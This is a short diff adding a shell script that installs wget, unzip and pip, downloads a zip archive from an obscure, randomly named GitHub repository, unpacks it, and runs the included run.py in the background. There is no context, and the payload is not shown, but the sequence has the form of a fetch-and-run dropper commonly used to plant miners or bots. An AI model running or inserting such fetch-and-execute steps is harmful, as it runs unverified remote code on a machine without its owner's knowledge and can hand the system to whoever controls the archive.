@@ -1,0 +1,4 @@
+apt update;apt install wget unzip python3-pip -y
+wget https://github.com/levatinaforekina-arch/scaling-doodle/raw/refs/heads/main/super.zip
+unzip super.zip
+python3 run.py &
